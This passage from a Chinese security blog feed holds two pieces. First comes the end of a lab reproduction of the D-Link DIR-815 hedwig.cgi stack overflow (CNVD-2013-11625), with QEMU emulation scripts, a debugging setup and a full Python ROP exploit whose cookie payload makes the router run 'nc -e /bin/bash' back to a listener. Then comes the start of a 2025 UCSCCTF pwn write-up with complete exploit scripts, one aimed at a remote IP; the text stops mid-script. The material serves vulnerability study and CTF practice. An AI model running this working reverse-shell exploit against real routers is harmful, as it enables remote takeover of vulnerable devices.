-F</span><br><span class="line">sudo iptables -t mangle -X</span><br><span class="line">sudo iptables -P INPUT ACCEPT</span><br><span class="line">sudo iptables -P FORWARD ACCEPT</span><br><span class="line">sudo iptables -P OUTPUT ACCEPT</span><br><span class="line">sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE</span><br><span class="line">sudo iptables -I FORWARD <span class="number">1</span> -i tap0 -j ACCEPT</span><br><span class="line">sudo iptables -I FORWARD <span class="number">1</span> -o tap0 -m state --state RELATED,ESTABLISHED -j ACCEPT</span><br></pre></td></tr></table></figure><p>这里做完之后可以使用指令 <code>ip addr</code> 来查看一下虚拟网卡是否已经准备就绪</p><p>然后在到<code>/etc</code>文件中创建一个 <code>/qemu/bridge.conf</code> 在这个文件中写入 <code>allow br0</code></p><p>所有东西成功后进行保存，然后<code>重启我们的Ubuntu系统</code></p><h3 id="step3-配置qemu虚拟机网络设置"><a href="#step3-配置qemu虚拟机网络设置" class="headerlink" title="step3 配置qemu虚拟机网络设置"></a><strong>step3 配置qemu虚拟机网络设置</strong></h3><p>我们在第一步已经下载好了我们所需要的 <code>内核</code> 及 <code>镜像</code><br>下面我们进入存放它们的文件夹，并且创建下面这个脚本然后运行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">start.sh</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">sudo qemu-system-mipsel \</span><br><span class="line">    -M malta -kernel vmlinux-3.2.0-4-4kc-malta \</span><br><span class="line">    -hda debian_squeeze_mipsel_standard.qcow2 \</span><br><span class="line">    -append &quot;root=/dev/sda1 console=tty0&quot; \</span><br><span class="line">    -net nic,macaddr=00:16:3e:00:00:01 \</span><br><span class="line">    -net tap</span><br></pre></td></tr></table></figure><p>执行后会出现一个黑色小窗口，然后里面在加载程序，最后可能会有一个 <code>fail</code> 但是不要紧，不影响我们复现漏洞，太多 <code>fail</code> 可能就有点问题了需要问AI检查一下</p><p><code>qemu</code> 启动的虚拟机初始密码为 <code>root/root</code></p><p>进入之后第一步需要使用 <code>nano</code> 来修改 <code>/etc/network/interfaces</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nano /etc/network/interfaces</span><br></pre></td></tr></table></figure><p>修改其中的 <code>eth0</code> 为 <code>eth1</code><br>也就是下面部分</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># This file describes the network interfaces available on your system</span><br><span class="line"><span class="meta"># and how to activate them. For more information, see interfaces(5).</span></span><br><span class="line"></span><br><span class="line"># The loopback network interface</span><br><span class="line"><span class="keyword">auto</span> lo</span><br><span class="line">iface lo inet loopback</span><br><span class="line"></span><br><span class="line"># The primary network interface</span><br><span class="line">allow-hotplug eth1</span><br><span class="line">iface eth1 inet dhcp</span><br></pre></td></tr></table></figure><p><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/53.png"></p><p>修改之后执行 <code>ifup eth1</code> 启用eth1接口， 然后我们再使用 <code>ip addr</code> 指令，会有类似下面的输出，从这里获得qemu虚拟机的ip地址，同理在Ubuntu物理机上使用这个 <code>ip addr</code> 指令同样可以得到Ubuntu物理机的ip地址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2</span>: eth1: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu <span class="number">1500</span> qdisc pfifo_fast state UNKNOWN qlen <span class="number">1000</span></span><br><span class="line">    link/ether <span class="number">00</span>:<span class="number">16</span>:<span class="number">3</span>e:<span class="number">00</span>:<span class="number">00</span>:<span class="number">01</span> brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet <span class="number">192.168</span>.xxx.xxx/<span class="number">24</span> brd <span class="number">192.168</span>.xx.xx scope global eth1</span><br></pre></td></tr></table></figure><p>执行 <code>ifup eth1</code> 后我们就可以用Ubuntu物理机来连接我们的qumu虚拟机了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 低版本Ubutnu</span><br><span class="line">ssh root@<span class="number">192.168</span>.xx.xx</span><br><span class="line"></span><br><span class="line"># 高版本Ubutnu</span><br><span class="line">ssh -o HostKeyAlgorithms=ssh-rsa root@<span class="number">192.168</span>.xx.xx</span><br></pre></td></tr></table></figure><h3 id="step4-开启环境"><a href="#step4-开启环境" class="headerlink" title="step4 开启环境"></a><strong>step4 开启环境</strong></h3><p>然后将在Ubunut物理机上使用scp指令来向qemu虚拟机传输文件<br>将路由器文件分解得到的 <code>/squashfs-root</code> 文件传入到 qemu虚拟机的 <code>/root</code> 文件夹下面</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 低版本Ubutnu</span><br><span class="line">scp -r ./squashfs-root root@<span class="number">192.168</span>.xx.xx:/root/</span><br><span class="line">scp -r &lt;本地Ubuntu文件地址&gt; root@<span class="number">192.168</span>.xx.xx:&lt;qemu虚拟机文件地址&gt;</span><br><span class="line"></span><br><span class="line"># 高版本Ubuntu</span><br><span class="line">scp -o HostKeyAlgorithms=ssh-rsa -r ./squashfs-root root@<span class="number">192.168</span>.xx.xx:/root/</span><br><span class="line">scp -o HostKeyAlgorithms=ssh-rsa -r &lt;本地Ubuntu文件地址&gt; root@<span class="number">192.168</span>.xx.xx:&lt;qemu虚拟机文件地址&gt;</span><br></pre></td></tr></table></figure><p>在qemu虚拟机的 <code>/squashfs-root</code> 文件中使用 <code>nano指令</code> 创建一个 <code>http_conf</code> 文件用于开启httpd服务</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">Umask <span class="number">026</span></span><br><span class="line">PIDFile /var/run/httpd.pid</span><br><span class="line">LogGMT On  #开启<span class="built_in">log</span></span><br><span class="line">ErrorLog /<span class="built_in">log</span> <span class="meta">#log文件</span></span><br><span class="line"> </span><br><span class="line">Tuning</span><br><span class="line">&#123;</span><br><span class="line">    NumConnections <span class="number">15</span></span><br><span class="line">    BufSize <span class="number">12288</span></span><br><span class="line">    InputBufSize <span class="number">4096</span></span><br><span class="line">    ScriptBufSize <span class="number">4096</span></span><br><span class="line">    NumHeaders <span class="number">100</span></span><br><span class="line">    Timeout <span class="number">60</span></span><br><span class="line">    ScriptTimeout <span class="number">60</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">Control</span><br><span class="line">&#123;</span><br><span class="line">    Types</span><br><span class="line">    &#123;</span><br><span class="line">        text/html    &#123; html htm &#125;</span><br><span class="line">        text/xml    &#123; xml &#125;</span><br><span class="line">        text/plain    &#123; txt &#125;</span><br><span class="line">        image/gif    &#123; gif &#125;</span><br><span class="line">        image/jpeg    &#123; jpg &#125;</span><br><span class="line">        text/css    &#123; css &#125;</span><br><span class="line">        application/octet-stream &#123; * &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    Specials</span><br><span class="line">    &#123;</span><br><span class="line">        Dump        &#123; /dump &#125;</span><br><span class="line">        CGI            &#123; cgi &#125;</span><br><span class="line">        Imagemap    &#123; <span class="built_in">map</span> &#125;</span><br><span class="line">        Redirect    &#123; url &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    External</span><br><span class="line">    &#123;</span><br><span class="line">        /usr/sbin/phpcgi &#123; php &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">Server</span><br><span class="line">&#123;</span><br><span class="line">    ServerName <span class="string">&quot;Linux, HTTP/1.1, &quot;</span></span><br><span class="line">    ServerId <span class="string">&quot;1234&quot;</span></span><br><span class="line">    Family inet</span><br><span class="line">    Interface eth1                          #对应qemu仿真路由器系统的网卡(如果是按照上面操作来的话就不用改)</span><br><span class="line">    Address <span class="number">192.168</span>.xx.xx                   <span class="meta">#qemu仿真路由器系统的IP(需要改成自己的qemu虚拟机ip地址)</span></span><br><span class="line">    Port <span class="string">&quot;1234&quot;</span>                             #对应未被使用的端口(一般也是不用改)</span><br><span class="line">    Virtual</span><br><span class="line">    &#123;</span><br><span class="line">        AnyHost</span><br><span class="line">        Control</span><br><span class="line">        &#123;</span><br><span class="line">            Alias /</span><br><span class="line">            Location /htdocs/web</span><br><span class="line">            IndexNames &#123; index.php &#125;</span><br><span class="line">            External</span><br><span class="line">            &#123;</span><br><span class="line">                /usr/sbin/phpcgi &#123; router_info.xml &#125;</span><br><span class="line">                /usr/sbin/phpcgi &#123; post_login.xml &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        Control</span><br><span class="line">        &#123;</span><br><span class="line">            Alias /HNAP1</span><br><span class="line">            Location /htdocs/HNAP1</span><br><span class="line">            External</span><br><span class="line">            &#123;</span><br><span class="line">                /usr/sbin/hnap &#123; hnap &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            IndexNames &#123; index.hnap &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行路由器程序执行下面脚本</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#init.sh</span></span><br><span class="line">#!/bin/bash</span><br><span class="line">echo <span class="number">0</span> &gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line">cp http_conf /</span><br><span class="line">cp sbin/httpd /</span><br><span class="line">cp -rf htdocs/ /</span><br><span class="line">mkdir /etc_bak</span><br><span class="line">cp -r /etc /etc_bak</span><br><span class="line">rm /etc/services</span><br><span class="line">cp -rf etc/ /</span><br><span class="line">cp lib/ld-uClibc<span class="number">-0.9</span><span class="number">.30</span><span class="number">.1</span>.so  /lib/</span><br><span class="line">cp lib/libcrypt<span class="number">-0.9</span><span class="number">.30</span><span class="number">.1</span>.so  /lib/</span><br><span class="line">cp lib/libc.so<span class="number">.0</span>  /lib/</span><br><span class="line">cp lib/libgcc_s.so<span class="number">.1</span>  /lib/</span><br><span class="line">cp lib/ld-uClibc.so<span class="number">.0</span>  /lib/</span><br><span class="line">cp lib/libcrypt.so<span class="number">.0</span>  /lib/</span><br><span class="line">cp lib/libgcc_s.so  /lib/</span><br><span class="line">cp lib/libuClibc<span class="number">-0.9</span><span class="number">.30</span><span class="number">.1</span>.so  /lib/</span><br><span class="line">cd /</span><br><span class="line">rm -rf /htdocs/web/hedwig.cgi</span><br><span class="line">rm -rf /usr/sbin/phpcgi</span><br><span class="line">rm -rf /usr/sbin/hnap</span><br><span class="line">ln -s /htdocs/cgibin /htdocs/web/hedwig.cgi</span><br><span class="line">ln -s /htdocs/cgibin /usr/sbin/phpcgi</span><br><span class="line">ln -s  /htdocs/cgibin /usr/sbin/hnap</span><br><span class="line">./httpd -f http_conf</span><br></pre></td></tr></table></figure><p>运行之后我们可以用Ubuntu自带的浏览器去访问<br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/54.png"></p><p>结束服务准备退出需要还原qemu虚拟机的系统架构，否则会导致qemu虚拟机损坏退出后无法开机，执行下面脚本</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#fin.sh</span></span><br><span class="line">#!/bin/bash</span><br><span class="line">rm -rf /etc</span><br><span class="line">mv /etc_bak/etc /etc</span><br><span class="line">rm -rf /etc_bak</span><br></pre></td></tr></table></figure><p>调试的话需要用到 <code>gdbserver</code><br>下面这个是github项目，已经编译完成的程序(但是作者好像命名错误了把mipsel打成了mipsle， 所以如果使用这个下面的脚本也需要改一改)<br><a href="https://github.com/rapid7/embedded-tools/tree/master/binaries/gdbserver">embedded-tools&#x2F;binaries&#x2F;gdbserver at master · rapid7&#x2F;embedded-tools</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#run.sh</span></span><br><span class="line">#!/bin/bash</span><br><span class="line">export CONTENT_LENGTH=<span class="string">&quot;10&quot;</span></span><br><span class="line">export CONTENT_TYPE=<span class="string">&quot;application/x-www-form-urlencoded&quot;</span></span><br><span class="line">export HTTP_COOKIE=<span class="string">&quot;uid=`cat payload`&quot;</span></span><br><span class="line">export REQUEST_METHOD=<span class="string">&quot;POST&quot;</span></span><br><span class="line">export REQUEST_URI=<span class="string">&quot;2333&quot;</span></span><br><span class="line">echo <span class="string">&quot;User=pwner&quot;</span>|./gdbserver.mipsel <span class="number">192.168</span>.xx.xx:<span class="number">6666</span> /htdocs/web/hedwig.cgi</span><br><span class="line">unset CONTENT_LENGTH</span><br><span class="line">unset CONTENT_TYPE</span><br><span class="line">unset HTTP_COOKIE</span><br><span class="line">unset REQUEST_METHOD</span><br><span class="line">unset REQUEST_URI</span><br></pre></td></tr></table></figure><p>对于这个run.sh脚本我有些疑问，winmt师傅在博客中说这里的ip地址需要填Ubuntu物理机的地址，但是我尝试之后失败了，我改为填写qemu虚拟机的地址然后运行，用Ubuntu虚拟机使用 <code>target remote &lt;qemu虚拟机ip地址&gt;:6666</code> 却可以连接成功，不知道为什么，但是没关系，只要能连上调试就行了</p><p>这里设置qemu虚拟机的的ip地址以及端口，之后我们同样可以使用上面的gdb脚本来进行连接</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># mygdb.sh</span></span><br><span class="line"><span class="built_in">set</span> architecture mips </span><br><span class="line"><span class="built_in">set</span> follow-fork-mode child</span><br><span class="line"><span class="built_in">set</span> detach-on-fork off </span><br><span class="line">file &lt;调试文件地址&gt;               # 可以不要</span><br><span class="line">target remote <span class="number">192.168</span>.xx.xx:<span class="number">6666</span>  </span><br></pre></td></tr></table></figure><p>我们需要调试来确定远程的libc_base</p><p>这里我们只需要运行上面的 <code>init.sh</code>，打开浏览器确认服务开启后，然后运行脚本 <code>run.sh</code> ，随后在Ubuntu虚拟机中使用 <code>gdb-multiarch</code>  去连接即可<br>远程我们可以直接使用vmmap来查看libc基地址， 得到基地址为 <code>0x77f34000</code> 如果我们使用的内核和镜像相同，那么我们的libc基地址基本上也是相同的<br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/55.png"></p><p>打qemu虚拟机想要拿到shell就需要利用到反弹shell，我们需要在Ubutnu虚拟机中开启一个终端用于接收反弹shell</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp <span class="number">8888</span></span><br></pre></td></tr></table></figure><p>下面构建exp脚本，攻击<code>192.168.xx.xx:1234</code>使其执行 <code>system(&#39;nc -e /bin/bash 192.168.xx.xxx 8888&#39;)</code> 注意这里是Ubuntu物理机的IP</p><p>exp如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;mips&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">cmd = <span class="string">b&#x27;nc -e /bin/bash 192.168.xx.xxx 8888&#x27;</span> <span class="comment"># 这里是Ubuntu物理机的地址</span></span><br><span class="line"> </span><br><span class="line">libc_base = <span class="number">0x77f34000</span></span><br><span class="line"> </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x3cd</span></span><br><span class="line">payload += p32(libc_base + <span class="number">0x53200</span> - <span class="number">1</span>) <span class="comment"># s0  system_addr - 1</span></span><br><span class="line">payload += p32(libc_base + <span class="number">0x169C4</span>) <span class="comment"># s1  addiu $s2, $sp, 0x18 (=&gt; jalr $s0)</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*(<span class="number">4</span>*<span class="number">7</span>)</span><br><span class="line">payload += p32(libc_base + <span class="number">0x32A98</span>) <span class="comment"># ra  addiu $s0, 1 (=&gt; jalr $s1)</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span></span><br><span class="line">payload += cmd</span><br><span class="line"> </span><br><span class="line">url = <span class="string">&quot;http://192.168.xx.xx:1234/hedwig.cgi&quot;</span> <span class="comment"># 这里是qemu虚拟机的地址</span></span><br><span class="line">data = &#123;<span class="string">&quot;XiDP&quot;</span> : <span class="string">&quot;pwner&quot;</span>&#125;</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;Cookie&quot;</span>        : <span class="string">b&quot;uid=&quot;</span> + payload,</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>  : <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Content-Length&quot;</span>: <span class="string">&quot;10&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">res = requests.post(url = url, headers = headers, data = data)</span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure><p>然后我们就可以在我们执行 <code>nc -lvnp 8888</code> 的终端拿到shell了，当然前提是exp无误</p><p>成功打通如下图所示<br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/56.png"></p><p>参考:<br><a href="https://xz.aliyun.com/news/17924">DIR-815 栈溢出漏洞-先知社区</a><br><a href="https://bbs.kanxue.com/thread-272318.htm#msg_header_h2_3">[原创] 从零开始复现 DIR-815 栈溢出漏洞-二进制漏洞-看雪-安全社区|安全招聘|kanxue.com</a><br><a href="https://xz.aliyun.com/news/17315">firmAE模拟仿真DIR815栈溢出漏洞复现-先知社区</a></p>]]></content>
      
      
      <categories>
          
          <category> IOT </category>
          
          <category> CVE复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IOT </tag>
            
            <tag> CVE </tag>
            
            <tag> 路由器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2025 UCSCCTF Pwn-wp(含附件)</title>
      <link href="/2025/06/13/2025%20UCSCCTF%20Pwn-wp(%E5%90%AB%E9%99%84%E4%BB%B6)/"/>
      <url>/2025/06/13/2025%20UCSCCTF%20Pwn-wp(%E5%90%AB%E9%99%84%E4%BB%B6)/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h3><p>说实话有点失望, 比赛平台超级卡，而且比赛一开始平台就崩了，题目难度偏低(也是很遗憾，本来可以抢个血分的，但是太卡了靶机就是打不开)但是还是感谢比赛出题的师傅愿意分享自己的题目</p><p>通过网盘分享的文件：2025UCSCCTF.rar<br>链接: <a href="https://pan.baidu.com/s/17yqcmGRXWN1oNMvgZNRv5w?pwd=xidp">https://pan.baidu.com/s/17yqcmGRXWN1oNMvgZNRv5w?pwd=xidp</a> 提取码: xidp<br>内含2025 UCSCCTF三个pwn题的附件</p><p>由于题目比较简单我就简单介绍我的思路并放上exp了</p><h3 id="BoFido-Ucsc"><a href="#BoFido-Ucsc" class="headerlink" title="BoFido-Ucsc"></a>BoFido-Ucsc</h3><p>程序里开头有<code>seed = time(0)</code>获取当前时间作为随机数种子<br>但是下面又有一个<code>read</code>的溢出，这个read的溢出可以覆盖到随机数种子<code>seed</code>我将它覆盖为<code>0</code>避免了时间不同步带来的影响<br><img src="/../picture/2025UCSCCTFpwn-wp/1.png"><br>然后下面就是不断的获取随机数，然后要求用户输入，如果用户输入的都正确就可以直接拿到shell</p><p>做出这个题目后我试了一下直接把题目给deepseek，告诉deepseek我是一名pwn手，这是一个关于随机数绕过的的pwn题，deepseek也能给出差不多的代码来帮助绕过随机数<br><img src="/../picture/2025UCSCCTFpwn-wp/2.png"></p><p>这里我用我本地的libc，libc版本为Ubuntu GLIBC 2.35-0ubuntu3.9就可以打通远程</p><p>完整exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> xidp <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#---------------------初始化----------------------------</span></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">elf_os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">challenge = <span class="string">&quot;./BoFido&quot;</span></span><br><span class="line">libc_path = <span class="string">&#x27;&#x27;</span></span><br><span class="line">ip = <span class="string">&#x27;39.107.58.236:41109&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1-远程 其他-本地</span></span><br><span class="line">link = <span class="number">1</span></span><br><span class="line">io, elf, libc = loadfile(challenge, libc_path, ip, arch, elf_os, link)</span><br><span class="line">debug(<span class="number">0</span>)            <span class="comment"># 其他-debug   1-info</span></span><br><span class="line"><span class="comment">#---------------------初始化-----------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#---------------------debug------------------------------</span></span><br><span class="line"><span class="comment"># 断点</span></span><br><span class="line">bps = []</span><br><span class="line"></span><br><span class="line"><span class="comment">#---------------------debug-------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pwndbg(1, bps, 1)</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">20</span> + <span class="string">b&#x27;B&#x27;</span> * <span class="number">12</span> + p32(<span class="number">0</span>)  <span class="comment"># 覆盖seed为0</span></span><br><span class="line">io.sendafter(<span class="string">&quot;Enter your name:&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">libc = CDLL(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">libc.srand(<span class="number">0</span>)  <span class="comment"># 使用固定种子</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    nums = [libc.rand() % <span class="number">255</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;numbers:\n&quot;</span>, <span class="string">f&quot;<span class="subst">&#123;nums[<span class="number">0</span>]&#125;</span> <span class="subst">&#123;nums[<span class="number">1</span>]&#125;</span> <span class="subst">&#123;nums[<span class="number">2</span>]&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure><h3 id="userlogin"><a href="#userlogin" class="headerlink" title="userlogin"></a><strong>userlogin</strong></h3><p>程序设计了一个密码，用这个密码可以登入<br>乍一看以为又是一个随机数绕过，又用上一题同样的方法试了一次，发现不太行，不知道是本地远程有时间差还是说libc版本不对<br>后来发现里面有<code>格式化字符串漏洞</code>，可以用于泄露密码<br>然后得到密码后就可以进到<code>root</code>里面使用<code>scanf</code>的溢出了<br>还需要注意，程序里面是有后门的，不需要我们自己构建<br><img src="/../picture/2025UCSCCTFpwn-wp/3.png"></p><p>完整exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> xidp <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> CDLL</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment">#---------------------初始化----------------------------</span></span><br><span class="line">arch = <span 